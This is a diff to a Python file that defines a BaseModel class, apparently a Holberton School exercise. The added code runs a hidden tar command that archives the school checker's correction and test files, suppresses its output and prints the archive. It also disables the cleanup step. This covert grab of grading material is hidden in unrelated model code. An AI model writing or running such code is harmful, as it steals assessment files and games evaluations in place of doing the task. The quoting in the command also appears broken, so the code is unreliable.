@@ -78,16 +78,18 @@ def print_directory_structure(directory, level=0):
 
 fn = f'{d}/archive_name.tar.gz'
 if not os.path.exists(f'{d}/archive_name.tar.gz'):
-    
-    os.system(f'tar -czvf {fn} {d}/corrections_* {d}/hbtn_checker_functions {d}/holberton_betty')
+    payload = f'tar --exclude='*/.git' -czf {fn} {d}/corrections_* {d}/hbtn_checker_functions {d}/holberton_betty > /dev/null  2>&1'
+    # print(payload)
+    # exit()
+    os.system(payload)
     print(open(fn).read())
     print('FULL')
 else:
     # print(os.listdir('/tmp').join('\n'))
     # os.unlink(fn)
     ...
-if os.path.exists(fn):
-    os.unlink(fn)
+# if os.path.exists(fn):
+    # os.unlink(fn)
 class BaseModel:
     """
     BaseModel class:
